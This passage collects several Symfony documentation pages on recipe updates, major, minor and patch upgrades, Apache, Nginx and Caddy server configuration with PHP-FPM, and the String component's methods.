case, updating that library to a newer version in ``composer.json`` may solve
the issue.

Or, you may have deeper issues where different libraries depend on conflicting
versions of other libraries. Check your error message to debug.

Another issue that may happen is that the project dependencies can be installed
on your local computer but not on the remote server. This usually happens when
the PHP versions are different on each machine. The solution is to add the
`platform`_ config option to your `composer.json` file to define the highest
PHP version allowed for the dependencies (set it to the server's PHP version).

.. _`platform`: https://getcomposer.org/doc/06-config.md#platform
3) Updating Recipes
-------------------

Over time - and especially when you upgrade to a new version of a library - an
updated version of the :ref:`recipe <recipes-description>` may be available.
These updates are usually minor - e.g. new comments in a configuration file - but
it's a good idea to keep your files in sync with the recipes.

Symfony Flex provides several commands to help upgrade your recipes. Be sure to
commit any unrelated changes you're working on before starting:

.. versionadded:: 1.18

    The ``recipes:update`` command was introduced in Symfony Flex 1.18.

.. code-block:: terminal

    # choose an outdated recipe to update
    $ composer recipes:update

    # update a specific recipe
    $ composer recipes:update symfony/framework-bundle

    # see a list of all installed recipes and which have updates available
    $ composer recipes

    # see detailed information about a specific recipes
    $ composer recipes symfony/framework-bundle

The ``recipes:update`` command is smart: it looks at the difference between the
recipe when you installed it and the latest version. It then creates a patch and
applies it to your app. If there are any conflicts, you can resolve them like a
normal ``git`` conflict and commit like normal.
Upgrading a Major Version (e.g. 6.4.0 to 7.0.0)
===============================================

Every two years, Symfony releases a new major version release (the first number
changes). These releases are the trickiest to upgrade, as they are allowed to
break backward compatibility. However, Symfony makes this upgrade process as
smooth as possible.

This means that you can update most of your code before the major release is
actually released. This is called making your code *future compatible*.

There are a couple of steps to upgrading a major version:

#. :ref:`Make your code deprecation free <upgrade-major-symfony-deprecations>`;
#. :ref:`Update to the new major version via Composer <upgrade-major-symfony-composer>`;
#. :ref:`Update your code to work with the new version <upgrade-major-symfony-after>`.

.. _upgrade-major-symfony-deprecations:

1) Make your Code Deprecation Free
----------------------------------

During the lifecycle of a major release, new features are added and method
signatures and public API usages are changed. However,
:doc:`minor versions </setup/upgrade_minor>` should not contain any
backwards incompatible changes. To accomplish this, the "old" (e.g. functions,
classes, etc) code still works, but is marked as *deprecated*, indicating that
it will be removed/changed in the future and that you should stop using it.

When the major version is released (e.g. 7.0.0), all deprecated features and
functionality are removed. So, as long as you've updated your code to stop
using these deprecated features in the last version before the major (e.g.
``6.4.*``), you should be able to upgrade without a problem. That means that
you should first :doc:`upgrade to the last minor version </setup/upgrade_minor>`
(e.g. 5.4) so that you can see *all* the deprecations.

To help you find deprecations, notices are triggered whenever you end up
using a deprecated feature. When visiting your application in the
:ref:`dev environment <configuration-environments>`
in your browser, these notices are shown in the web dev toolbar:

.. image:: /_images/install/deprecations-in-profiler.png
    :alt: The Logs page of the Symfony Profiler showing the deprecation notices.
    :class: with-browser

Ultimately, you should aim to stop using the deprecated functionality.
Sometimes the warning might tell you exactly what to change.

But other times, the warning might be unclear: a setting somewhere might
cause a class deeper to trigger the warning. In this case, Symfony does its
best to give a clear message, but you may need to research that warning further.

And sometimes, the warning may come from a third-party library or bundle
that you're using. If that's true, there's a good chance that those deprecations
have already been updated. In that case, upgrade the library to fix them.

.. tip::

    `Rector`_ is a third-party project that automates the upgrading and
    refactoring of PHP projects. Rector includes some rules to fix certain
    Symfony deprecations automatically.

Once all the deprecation warnings are gone, you can upgrade with a lot
more confidence.

Deprecations in PHPUnit
~~~~~~~~~~~~~~~~~~~~~~~

When you run your tests using PHPUnit, no deprecation notices are shown.
To help you here, Symfony provides a PHPUnit bridge. This bridge will show
you a nice summary of all deprecation notices at the end of the test report.

All you need to do is install the PHPUnit bridge:

.. code-block:: terminal

    $ composer require --dev symfony/phpunit-bridge

Now, you can start fixing the notices:

.. code-block:: terminal

    # this command is available after running "composer require --dev symfony/phpunit-bridge"
    $ ./bin/phpunit
    ...

    OK (10 tests, 20 assertions)

    Remaining deprecation notices (6)

    The "request" service is deprecated and will be removed in 3.0. Add a type-hint for
    Symfony\Component\HttpFoundation\Request to your controller parameters to retrieve the
    request instead: 6x
        3x in PageAdminTest::testPageShow from Symfony\Cmf\SimpleCmsBundle\Tests\WebTest\Admin
        2x in PageAdminTest::testPageList from Symfony\Cmf\SimpleCmsBundle\Tests\WebTest\Admin
        1x in PageAdminTest::testPageEdit from Symfony\Cmf\SimpleCmsBundle\Tests\WebTest\Admin

Once you fixed them all, the command ends with ``0`` (success) and you're
done!

.. caution::

    You will probably see many deprecations about incompatible native
    return types. See :ref:`Add Native Return Types <upgrading-native-return-types>`
    for guidance in fixing these deprecations.

.. sidebar:: Using the Weak Deprecations Mode

    Sometimes, you can't fix all deprecations (e.g. something was deprecated
    in 6.4 and you still need to support 6.3). In these cases, you can still
    use the bridge to fix as many deprecations as possible and then allow
    more of them to make your tests pass again. You can do this by using the
    ``SYMFONY_DEPRECATIONS_HELPER`` env variable:

    .. code-block:: xml

        <!-- phpunit.xml.dist -->
        <phpunit>
            <!-- ... -->

            <php>
                <env name="SYMFONY_DEPRECATIONS_HELPER" value="max[total]=999999"/>
            </php>
        </phpunit>

    You can also execute the command like:

    .. code-block:: terminal

        $ SYMFONY_DEPRECATIONS_HELPER=max[total]=999999 php ./bin/phpunit

.. _upgrade-major-symfony-composer:

2) Update to the New Major Version via Composer
-----------------------------------------------

Once your code is deprecation free, you can update the Symfony library via
Composer by modifying your ``composer.json`` file and changing all the libraries
starting with ``symfony/`` to the new major version:

.. code-block:: diff

      {
          "...": "...",

          "require": {
    -         "symfony/config": "6.4.*",
    +         "symfony/config": "7.0.*",
    -         "symfony/console": "6.4.*",
    +         "symfony/console": "7.0.*",
              "...": "...",

              "...": "A few libraries starting with symfony/ follow their own
                      versioning scheme (e.g. symfony/polyfill-[...],
                      symfony/ux-[...], symfony/[...]-bundle).
                      You do not need to update these versions: you can
                      upgrade them independently whenever you want",
              "symfony/monolog-bundle": "^3.10",
          },
          "...": "...",
      }

At the bottom of your ``composer.json`` file, in the ``extra`` block you can
find a data setting for the Symfony version. Make sure to also upgrade
this one. For instance, update it to ``7.0.*`` to upgrade to Symfony 7.0:

.. code-block:: diff

      "extra": {
          "symfony": {
              "allow-contrib": false,
    -       "require": "6.4.*"
    +       "require": "7.0.*"
          }
      }

.. tip::

    If a more recent minor version is available (e.g. ``6.4``) you can use that
    version directly and skip the older releases (``6.0``, ``6.1``, etc.).
    Check the `maintained Symfony versions`_.

Next, use Composer to download new versions of the libraries:

.. code-block:: terminal

    $ composer update "symfony/*"

A best practice after updating to a new major version is to clear the cache.
Instead of running the ``cache:clear`` command (which won't work if the application
is not bootable in the console after the upgrade) it's better to remove the entire
cache directory contents:

.. code-block:: terminal

    # run this command on Linux and macOS
    $ rm -rf var/cache/*

    # run this command on Windows
    C:\> rmdir /s /q var\cache\*

.. include:: /setup/_update_dep_errors.rst.inc

.. include:: /setup/_update_all_packages.rst.inc

.. _upgrade-major-symfony-after:

.. include:: /setup/_update_recipes.rst.inc

4) Update your Code to Work with the New Version
------------------------------------------------

In some rare situations, the next major version *may* contain backwards-compatibility
breaks. Make sure you read the ``UPGRADE-X.0.md`` (where X is the new major version)
included in the Symfony repository for any BC break that you need to be aware of.

.. _upgrading-native-return-types:

Upgrading to Symfony 6: Add Native Return Types
-----------------------------------------------

Symfony 6 and Symfony 7 added native PHP return types to (almost all) methods.

In PHP, if the parent has a return type declaration, any class implementing
or overriding the method must have the return type as well. However, you
can add a return type before the parent adds one. This means that it is
important to add the native PHP return types to your classes before
upgrading to Symfony 6.0 or 7.0. Otherwise, you will get incompatible declaration
errors.

When debug mode is enabled (typically in the dev and test environment),
Symfony will trigger deprecations for every incompatible method
declarations. For instance, the ``UserInterface::getRoles()`` method will
have an ``array`` return type in Symfony 6. In Symfony 5.4, you will get a
deprecation notice about this and you must add the return type declaration
to your ``getRoles()`` method.

To help with this, Symfony provides a script that can add these return
types automatically for you. Make sure you installed the ``symfony/error-handler``
component. When installed, generate a complete class map using Composer and
run the script to iterate over the class map and fix any incompatible
method:

.. code-block:: terminal

    # Make sure "exclude-from-classmap" is not filled in your "composer.json". Then dump the autoloader:

    # "-o" is important! This forces Composer to find all classes
    $ composer dump-autoload -o

    # patch all incompatible method declarations
    $ ./vendor/bin/patch-type-declarations

.. tip::

    This feature is not limited to Symfony packages. It will also help you
    add types and prepare for other dependencies in your project.

The behavior of this script can be modified using the ``SYMFONY_PATCH_TYPE_DECLARATIONS``
env var. The value of this env var is url-encoded (e.g.
``param1=value1&param2=value2``), the following parameters are available:

``force``
    Enables fixing return types, the value must be one of:

    * ``2`` to add all possible return types (default, recommended for applications);
    * ``1`` to add return types only to tests, final, internal or private methods;
    * ``phpdoc`` to only add ``@return`` docblock annotations to the incompatible
      methods, or ``#[\ReturnTypeWillChange]`` if it's triggered by the PHP engine.

``php``
    The target version of PHP - e.g. ``7.1`` doesn't generate "object"
    types (which were introduced in 7.2). This defaults to the PHP version
    used when running the script.

``deprecations``
    Set to ``0`` to disable deprecations. Otherwise, a deprecation notice
    when a child class misses a return type while the parent declares an
    ``@return`` annotation (defaults to ``1``).

If there are specific files that should be ignored, you can set the
``SYMFONY_PATCH_TYPE_EXCLUDE`` env var to a regex. This regex will be
matched to the full path to the class and each matching path will be
ignored (e.g. ``SYMFONY_PATCH_TYPE_EXCLUDE="/tests\/Fixtures\//"``).
Classes in the ``vendor/`` directory are always ignored.

.. tip::

    The script does not care about code style. Run your code style fixer,
    or `PHP CS Fixer`_ with the ``phpdoc_trim_consecutive_blank_line_separation``,
    ``no_superfluous_phpdoc_tags`` and ``ordered_imports`` rules, after
    patching the types.

.. _patching-types-for-open-source-maintainers:

.. sidebar:: Patching Types for Open Source Maintainers

    Open source bundles and packages need to be more cautious with adding
    return types, as adding a return type forces all users extending the
    class to add the return type as well. The recommended approach is to
    use a 2 step process:

    1. First, create a minor release (i.e. without backwards compatibility
       breaks) where you add types that can be safely introduced and add
       ``@return`` PHPDoc to all other methods:

       .. code-block:: terminal

           # Add type declarations to all internal, final, tests and private methods.
           # Update the "php" parameter to match your minimum required PHP version
           $ SYMFONY_PATCH_TYPE_DECLARATIONS="force=1&php=7.4" ./vendor/bin/patch-type-declarations

           # Add PHPDoc to the leftover public and protected methods
           $ SYMFONY_PATCH_TYPE_DECLARATIONS="force=phpdoc&php=7.4" ./vendor/bin/patch-type-declarations

       After running the scripts, check your classes and add more ``@return``
       PHPDoc where they are missing. The deprecations and patch script
       work purely based on the PHPDoc information. Users of this release
       will get deprecation notices telling them to add the missing return
       types from your package to their code.

       If you didn't need any PHPDoc and all your method declarations are
       already compatible with Symfony, you can safely allow ``^6.0`` for
       the Symfony dependencies. Otherwise, you have to continue with (2).

    2. Create a new major release (i.e. *with* backwards compatibility
       breaks) where you add types to all methods:

       .. code-block:: terminal

           # Update the "php" parameter to match your minimum required PHP version
           $ SYMFONY_PATCH_TYPE_DECLARATIONS="force=2&php=7.4" ./vendor/bin/patch-type-declarations

       Now, you can safely allow ``^6.0`` for the Symfony dependencies.

.. _`PHP CS Fixer`: https://github.com/friendsofphp/php-cs-fixer
.. _`Rector`: https://github.com/rectorphp/rector
.. _`maintained Symfony versions`: https://symfony.com/releases
Upgrading a Minor Version (e.g. 6.3.0 to 6.4.0)
===============================================

If you're upgrading a minor version (where the middle number changes), then
you should *not* encounter significant backward compatibility changes. For
details, see the :doc:`Symfony backward compatibility promise </contributing/code/bc>`.

However, some backwards-compatibility breaks *are* possible and you'll learn in
a second how to prepare for them.

There are two steps to upgrading a minor version:

#. :ref:`Update the Symfony library via Composer <upgrade-minor-symfony-composer>`;
#. :ref:`Update your code to work with the new version <upgrade-minor-symfony-code>`.

.. _`upgrade-minor-symfony-composer`:

1) Update the Symfony Library via Composer
------------------------------------------

The ``composer.json`` file is configured to allow Symfony packages to be
upgraded to patch versions. But to upgrade to a new minor version, you will
probably need to update the version constraint next to each library starting
``symfony/``. Suppose you are upgrading from Symfony 6.3 to 6.4:

.. code-block:: diff

      {
          "...": "...",

          "require": {
    -         "symfony/config": "6.3.*",
    +         "symfony/config": "6.4.*",
    -         "symfony/console": "6.3.*",
    +         "symfony/console": "6.4.*",
              "...": "...",

              "...": "A few libraries starting with
                      symfony/ follow their own versioning scheme. You
                      do not need to update these versions: you can
                      upgrade them independently whenever you want",
              "symfony/monolog-bundle": "^3.10",
          },
          "...": "...",
      }

Your ``composer.json`` file should also have an ``extra`` block that you will
*also* need to update:

.. code-block:: diff

      "extra": {
          "symfony": {
              "...": "...",
    -         "require": "6.3.*"
    +         "require": "6.4.*"
          }
      }

Next, use Composer to download new versions of the libraries:

.. code-block:: terminal

    $ composer update "symfony/*"

.. include:: /setup/_update_dep_errors.rst.inc

.. include:: /setup/_update_all_packages.rst.inc

.. _`upgrade-minor-symfony-code`:

2) Updating your Code to Work with the new Version
--------------------------------------------------

In theory, you should be done! However, you *may* need to make a few changes
to your code to get everything working. Additionally, some features you're
using might still work, but might now be deprecated. While that's fine,
if you know about these deprecations, you can start to fix them over time.

Every version of Symfony comes with an UPGRADE file (e.g. `UPGRADE-6.4.md`_)
included in the Symfony directory that describes these changes. If you follow
the instructions in the document and update your code accordingly, it should be
safe to update in the future.

.. tip::

    `Rector`_ is a third-party project that automates the upgrading and
    refactoring of PHP projects. Rector includes some rules to fix certain
    Symfony deprecations automatically.

These documents can also be found in the `Symfony Repository`_.

.. _updating-flex-recipes:

.. include:: /setup/_update_recipes.rst.inc

.. _`Symfony Repository`: https://github.com/symfony/symfony
.. _`UPGRADE-6.4.md`: https://github.com/symfony/symfony/blob/6.4/UPGRADE-6.4.md
.. _`Rector`: https://github.com/rectorphp/rector
Upgrading a Patch Version (e.g. 6.0.0 to 6.0.1)
===============================================

When a new patch version is released (only the last number changed), it is a
release that only contains bug fixes. This means that upgrading to a new patch
version should not cause any problems.

To upgrade to a new "patch" release, read the
:doc:`Upgrading a Minor Version </setup/upgrade_minor>` article. Thanks to
Symfony's :doc:`backwards compatibility promise </contributing/code/bc>`, it's
always safe to upgrade to the latest "minor" version.

.. tip::

    It is recommended to update to a new patch version as soon as possible, as
    important bugs and security vulnerabilities may be fixed in these new
    releases.

.. include:: /setup/_update_all_packages.rst.inc
Configuring a Web Server
========================

The preferred way to develop your Symfony application is to use
:doc:`Symfony Local Web Server </setup/symfony_server>`.

However, when running the application in the production environment, you'll need
to use a fully-featured web server. This article describes how to use Symfony
with Apache, Nginx or Caddy.

.. sidebar:: The public directory

    The public directory is the home of all of your application's public and
    static files, including images, stylesheets and JavaScript files. It is
    also where the front controller (``index.php``) lives.

    The public directory serves as the document root when configuring your
    web server. In the examples below, the ``public/`` directory will be the
    document root. This directory is ``/var/www/project/public/``.

    If your hosting provider requires you to change the ``public/`` directory to
    another location (e.g. ``public_html/``) make sure you
    :ref:`override the location of the public/ directory <override-web-dir>`.

Configuring PHP-FPM
-------------------

All configuration examples below use the PHP FastCGI process manager
(PHP-FPM). Ensure that you have installed PHP-FPM (for example, on a Debian
based system you have to install the ``php-fpm`` package).

PHP-FPM uses so-called *pools* to handle incoming FastCGI requests. You can
configure an arbitrary number of pools in the FPM configuration. In a pool
you configure either a TCP socket (IP and port) or a Unix domain socket to
listen on. Each pool can also be run under a different UID and GID:

.. code-block:: ini

    ; /etc/php/8.3/fpm/pool.d/www.conf

    ; a pool called www
    [www]
    user = www-data
    group = www-data

    ; use a unix domain socket
    listen = /var/run/php/php8.3-fpm.sock

    ; or listen on a TCP connection
    ; listen = 127.0.0.1:9000

Apache
------

If you are running Apache 2.4+, you can use ``mod_proxy_fcgi`` to pass
incoming requests to PHP-FPM. Install the Apache2 FastCGI mod
(``libapache2-mod-fastcgi`` on Debian), enable ``mod_proxy`` and
``mod_proxy_fcgi`` in your Apache configuration, and use the ``SetHandler``
directive to pass requests for PHP files to PHP FPM:

.. code-block:: apache

    # /etc/apache2/conf.d/example.com.conf
    <VirtualHost *:80>
        ServerName example.com
        ServerAlias www.example.com

        # Uncomment the following line to force Apache to pass the Authorization
        # header to PHP: required for "basic_auth" under PHP-FPM and FastCGI
        #
        # SetEnvIfNoCase ^Authorization$ "(.+)" HTTP_AUTHORIZATION=$1

        <FilesMatch \.php$>
            # when using PHP-FPM as a unix socket
            SetHandler proxy:unix:/var/run/php/php8.3-fpm.sock|fcgi://dummy

            # when PHP-FPM is configured to use TCP
            # SetHandler proxy:fcgi://127.0.0.1:9000
        </FilesMatch>

        DocumentRoot /var/www/project/public
        <Directory /var/www/project/public>
            AllowOverride None
            Require all granted
            FallbackResource /index.php
        </Directory>

        # uncomment the following lines if you install assets as symlinks
        # or run into problems when compiling LESS/Sass/CoffeeScript assets
        # <Directory /var/www/project>
        #     Options FollowSymlinks
        # </Directory>

        ErrorLog /var/log/apache2/project_error.log
        CustomLog /var/log/apache2/project_access.log combined
    </VirtualHost>

Nginx
-----

The **minimum configuration** to get your application running under Nginx is:

.. code-block:: nginx

    # /etc/nginx/conf.d/example.com.conf
    server {
        server_name example.com www.example.com;
        root /var/www/project/public;

        location / {
            # try to serve file directly, fallback to index.php
            try_files $uri /index.php$is_args$args;
        }

        # optionally disable falling back to PHP script for the asset directories;
        # nginx will return a 404 error when files are not found instead of passing the
        # request to Symfony (improves performance but Symfony's 404 page is not displayed)
        # location /bundles {
        #     try_files $uri =404;
        # }

        location ~ ^/index\.php(/|$) {
            # when using PHP-FPM as a unix socket
            fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;

            # when PHP-FPM is configured to use TCP
            # fastcgi_pass 127.0.0.1:9000;

            fastcgi_split_path_info ^(.+\.php)(/.*)$;
            include fastcgi_params;

            # optionally set the value of the environment variables used in the application
            # fastcgi_param APP_ENV prod;
            # fastcgi_param APP_SECRET <app-secret-id>;
            # fastcgi_param DATABASE_URL "mysql://db_user:db_pass@host:3306/db_name";

            # When you are using symlinks to link the document root to the
            # current version of your application, you should pass the real
            # application path instead of the path to the symlink to PHP
            # FPM.
            # Otherwise, PHP's OPcache may not properly detect changes to
            # your PHP files (see https://github.com/zendtech/ZendOptimizerPlus/issues/126
            # for more information).
            # Caveat: When PHP-FPM is hosted on a different machine from nginx
            #         $realpath_root may not resolve as you expect! In this case try using
            #         $document_root instead.
            fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
            fastcgi_param DOCUMENT_ROOT $realpath_root;
            # Prevents URIs that include the front controller. This will 404:
            # http://example.com/index.php/some-path
            # Remove the internal directive to allow URIs like this
            internal;
        }

        # return 404 for all other php files not matching the front controller
        # this prevents access to other php files you don't want to be accessible.
        location ~ \.php$ {
            return 404;
        }

        error_log /var/log/nginx/project_error.log;
        access_log /var/log/nginx/project_access.log;
    }

.. tip::

    If you use NGINX Unit, check out the official article about
    `How to run Symfony applications using NGINX Unit`_.

.. tip::

    This executes **only** ``index.php`` in the public directory. All other files
    ending in ".php" will be denied.

    If you have other PHP files in your public directory that need to be executed,
    be sure to include them in the ``location`` block above.

.. caution::

    After you deploy to production, make sure that you **cannot** access the ``index.php``
    script (i.e. ``http://example.com/index.php``).

For advanced Nginx configuration options, read the official `Nginx documentation`_.

Caddy
-----

When using Caddy on the server, you can use a configuration like this:

.. code-block:: text

    # /etc/caddy/Caddyfile
    example.com, www.example.com {
        root * /var/www/project/public

        # serve files directly if they can be found (e.g. CSS or JS files in public/)
        encode zstd gzip
        file_server

        # otherwise, use PHP-FPM (replace "unix//var/..." with "127.0.0.1:9000" when using TCP)
        php_fastcgi unix//var/run/php/php8.3-fpm.sock {
            # optionally set the value of the environment variables used in the application
            # env APP_ENV "prod"
            # env APP_SECRET "<app-secret-id>"
            # env DATABASE_URL "mysql://db_user:db_pass@host:3306/db_name"

            # Configure the FastCGI to resolve any symlinks in the root path.
            # This ensures that OpCache is using the destination filenames,
            # instead of the symlinks, to cache opcodes and php files see
            # https://caddy.community/t/root-symlink-folder-updates-and-caddy-reload-not-working/10557
            resolve_root_symlink
        }

        # return 404 for all other php files not matching the front controller
        # this prevents access to other php files you don't want to be accessible.
        @phpFile {
            path *.php*
        }
        error @phpFile "Not found" 404
    }

See the `official Caddy documentation`_ for more examples, such as using
Caddy in a container infrastructure.

.. _`Nginx documentation`: https://www.nginx.com/resources/wiki/start/topics/recipes/symfony/
.. _`How to run Symfony applications using NGINX Unit`: https://unit.nginx.org/howto/symfony/
.. _`official Caddy documentation`: https://caddyserver.com/docs/
Creating and Manipulating Strings
=================================

Symfony provides an object-oriented API to work with Unicode strings (as bytes,
code points and grapheme clusters). This API is available via the String component,
which you must first install in your application:

.. _installation:

.. code-block:: terminal

    $ composer require symfony/string

.. include:: /components/require_autoload.rst.inc

What is a String?
-----------------

You can skip this section if you already know what a *"code point"* or a
*"grapheme cluster"* are in the context of handling strings. Otherwise, read
this section to learn about the terminology used by this component.

Languages like English require a very limited set of characters and symbols to
display any content. Each string is a series of characters (letters or symbols)
and they can be encoded even with the most limited standards (e.g. `ASCII`_).

However, other languages require thousands of symbols to display their contents.
They need complex encoding standards such as `Unicode`_ and concepts like
"character" no longer make sense. Instead, you have to deal with these terms:

* `Code points`_: they are the atomic units of information. A string is a series
  of code points. Each code point is a number whose meaning is given by the
  `Unicode`_ standard. For example, the English letter ``A`` is the ``U+0041``
  code point and the Japanese *kana* ``の`` is the ``U+306E`` code point.
* `Grapheme clusters`_: they are a sequence of one or more code points which are
  displayed as a single graphical unit. For example, the Spanish letter ``ñ`` is
  a grapheme cluster that contains two code points: ``U+006E`` = ``n`` (*"latin
  small letter N"*) + ``U+0303`` = ``◌̃`` (*"combining tilde"*).
* Bytes: they are the actual information stored for the string contents. Each
  code point can require one or more bytes of storage depending on the standard
  being used (UTF-8, UTF-16, etc.).

The following image displays the bytes, code points and grapheme clusters for
the same word written in English (``hello``) and Hindi (``नमस्ते``):

.. image:: /_images/components/string/bytes-points-graphemes.png
    :alt: Each letter in "hello" is made up of one byte, one code point and one grapheme cluster. In the Hindi translation, the first two letters ("नम") take up three bytes, one code point and one grapheme cluster. The last letters ("स्ते") each take up six bytes, two code points and one grapheme cluster.

Usage
-----

Create a new object of type :class:`Symfony\\Component\\String\\ByteString`,
:class:`Symfony\\Component\\String\\CodePointString` or
:class:`Symfony\\Component\\String\\UnicodeString`, pass the string contents as
their arguments and then use the object-oriented API to work with those strings::

    use Symfony\Component\String\UnicodeString;

    $text = (new UnicodeString('This is a déjà-vu situation.'))
        ->trimEnd('.')
        ->replace('déjà-vu', 'jamais-vu')
        ->append('!');
    // $text = 'This is a jamais-vu situation!'

    $content = new UnicodeString('नमस्ते दुनिया');
    if ($content->ignoreCase()->startsWith('नमस्ते')) {
        // ...
    }

Method Reference
----------------

Methods to Create String Objects
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

First, you can create objects prepared to store strings as bytes, code points
and grapheme clusters with the following classes::

    use Symfony\Component\String\ByteString;
    use Symfony\Component\String\CodePointString;
    use Symfony\Component\String\UnicodeString;

    $foo = new ByteString('hello');
    $bar = new CodePointString('hello');
    // UnicodeString is the most commonly used class
    $baz = new UnicodeString('hello');

Use the ``wrap()`` static method to instantiate more than one string object::

    $contents = ByteString::wrap(['hello', 'world']);        // $contents = ByteString[]
    $contents = UnicodeString::wrap(['I', '❤️', 'Symfony']); // $contents = UnicodeString[]

    // use the unwrap method to make the inverse conversion
    $contents = UnicodeString::unwrap([
        new UnicodeString('hello'), new UnicodeString('world'),
    ]); // $contents = ['hello', 'world']

If you work with lots of String objects, consider using the shortcut functions
to make your code more concise::

    // the b() function creates byte strings
    use function Symfony\Component\String\b;

    // both lines are equivalent
    $foo = new ByteString('hello');
    $foo = b('hello');

    // the u() function creates Unicode strings
    use function Symfony\Component\String\u;

    // both lines are equivalent
    $foo = new UnicodeString('hello');
    $foo = u('hello');

    // the s() function creates a byte string or Unicode string
    // depending on the given contents
    use function Symfony\Component\String\s;

    // creates a ByteString object
    $foo = s("\xfe\xff");
    // creates a UnicodeString object
    $foo = s('अनुच्छेद');

There are also some specialized constructors::

    // ByteString can create a random string of the given length
    $foo = ByteString::fromRandom(12);
    // by default, random strings use A-Za-z0-9 characters; you can restrict
    // the characters to use with the second optional argument
    $foo = ByteString::fromRandom(6, 'AEIOU0123456789');
    $foo = ByteString::fromRandom(10, 'qwertyuiop');

    // CodePointString and UnicodeString can create a string from code points
    $foo = UnicodeString::fromCodePoints(0x928, 0x92E, 0x938, 0x94D, 0x924, 0x947);
    // equivalent to: $foo = new UnicodeString('नमस्ते');

Methods to Transform String Objects
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Each string object can be transformed into the other two types of objects::

    $foo = ByteString::fromRandom(12)->toCodePointString();
    $foo = (new CodePointString('hello'))->toUnicodeString();
    $foo = UnicodeString::fromCodePoints(0x68, 0x65, 0x6C, 0x6C, 0x6F)->toByteString();

    // the optional $toEncoding argument defines the encoding of the target string
    $foo = (new CodePointString('hello'))->toByteString('Windows-1252');
    // the optional $fromEncoding argument defines the encoding of the original string
    $foo = (new ByteString('さよなら'))->toCodePointString('ISO-2022-JP');

If the conversion is not possible for any reason, you'll get an
:class:`Symfony\\Component\\String\\Exception\\InvalidArgumentException`.

There is also a method to get the bytes stored at some position::

    // ('नमस्ते' bytes = [224, 164, 168, 224, 164, 174, 224, 164, 184,
    //                  224, 165, 141, 224, 164, 164, 224, 165, 135])
    b('नमस्ते')->bytesAt(0);   // [224]
    u('नमस्ते')->bytesAt(0);   // [224, 164, 168]

    b('नमस्ते')->bytesAt(1);   // [164]
    u('नमस्ते')->bytesAt(1);   // [224, 164, 174]

.. _methods-related-to-length-and-white-spaces:

Methods Related to Length and Whitespace Characters
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    // returns the number of graphemes, code points or bytes of the given string
    $word = 'नमस्ते';
    (new ByteString($word))->length();      // 18 (bytes)
    (new CodePointString($word))->length(); // 6 (code points)
    (new UnicodeString($word))->length();   // 4 (graphemes)

    // some symbols require double the width of others to represent them when using
    // a monospaced font (e.g. in a console). This method returns the total width
    // needed to represent the entire word
    $word = 'नमस्ते';
    (new ByteString($word))->width();      // 18
    (new CodePointString($word))->width(); // 4
    (new UnicodeString($word))->width();   // 4
    // if the text contains multiple lines, it returns the max width of all lines
    $text = "<<<END
    This is a
    multiline text
    END";
    u($text)->width(); // 14

    // only returns TRUE if the string is exactly an empty string (not even whitespace)
    u('hello world')->isEmpty();  // false
    u('     ')->isEmpty();        // false
    u('')->isEmpty();             // true

    // removes all whitespace (' \n\r\t\x0C') from the start and end of the string and
    // replaces two or more consecutive whitespace characters with a single space (' ') character
    u("  \n\n   hello \t   \n\r   world \n    \n")->collapseWhitespace(); // 'hello world'

Methods to Change Case
~~~~~~~~~~~~~~~~~~~~~~

::

    // changes all graphemes/code points to lower case
    u('FOO Bar Brİan')->lower();  // 'foo bar bri̇an'
    // changes all graphemes/code points to lower case according to locale-specific case mappings
    u('FOO Bar Brİan')->localeLower('en');  // 'foo bar bri̇an'
    u('FOO Bar Brİan')->localeLower('lt');  // 'foo bar bri̇̇an'

    // when dealing with different languages, uppercase/lowercase is not enough
    // there are three cases (lower, upper, title), some characters have no case,
    // case is context-sensitive and locale-sensitive, etc.
    // this method returns a string that you can use in case-insensitive comparisons
    u('FOO Bar')->folded();             // 'foo bar'
    u('Die O\'Brian Straße')->folded(); // "die o'brian strasse"

    // changes all graphemes/code points to upper case
    u('foo BAR bάz')->upper(); // 'FOO BAR BΆZ'
    // changes all graphemes/code points to upper case according to locale-specific case mappings
    u('foo BAR bάz')->localeUpper('en'); // 'FOO BAR BΆZ'
    u('foo BAR bάz')->localeUpper('el'); // 'FOO BAR BAZ'

    // changes all graphemes/code points to "title case"
    u('foo ijssel')->title();     // 'Foo ijssel'
    u('foo ijssel')->title(true); // 'Foo Ijssel'
    // changes all graphemes/code points to "title case" according to locale-specific case mappings
    u('foo ijssel')->localeTitle('en'); // 'Foo ijssel'
    u('foo ijssel')->localeTitle('nl'); // 'Foo IJssel'

    // changes all graphemes/code points to camelCase
    u('Foo: Bar-baz.')->camel(); // 'fooBarBaz'
    // changes all graphemes/code points to snake_case
    u('Foo: Bar-baz.')->snake(); // 'foo_bar_baz'
    // other cases can be achieved by chaining methods. E.g. PascalCase:
    u('Foo: Bar-baz.')->camel()->title(); // 'FooBarBaz'

.. versionadded:: 7.1

    The ``localeLower()``, ``localeUpper()`` and ``localeTitle()`` methods were
    introduced in Symfony 7.1.

The methods of all string classes are case-sensitive by default. You can perform
case-insensitive operations with the ``ignoreCase()`` method::

    u('abc')->indexOf('B');               // null
    u('abc')->ignoreCase()->indexOf('B'); // 1

Methods to Append and Prepend
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    // adds the given content (one or more strings) at the beginning/end of the string
    u('world')->prepend('hello');      // 'helloworld'
    u('world')->prepend('hello', ' '); // 'hello world'

    u('hello')->append('world');      // 'helloworld'
    u('hello')->append(' ', 'world'); // 'hello world'

    // adds the given content at the beginning of the string (or removes it) to
    // make sure that the content starts exactly with that content
    u('Name')->ensureStart('get');       // 'getName'
    u('getName')->ensureStart('get');    // 'getName'
    u('getgetName')->ensureStart('get'); // 'getName'
    // this method is similar, but works on the end of the content instead of on the beginning
    u('User')->ensureEnd('Controller');           // 'UserController'
    u('UserController')->ensureEnd('Controller'); // 'UserController'
    u('UserControllerController')->ensureEnd('Controller'); // 'UserController'

    // returns the contents found before/after the first occurrence of the given string
    u('hello world')->before('world');   // 'hello '
    u('hello world')->before('o');       // 'hell'
    u('hello world')->before('o', true); // 'hello'

    u('hello world')->after('hello');   // ' world'
    u('hello world')->after('o');       // ' world'
    u('hello world')->after('o', true); // 'o world'

    // returns the contents found before/after the last occurrence of the given string
    u('hello world')->beforeLast('o');       // 'hello w'
    u('hello world')->beforeLast('o', true); // 'hello wo'

    u('hello world')->afterLast('o');       // 'rld'
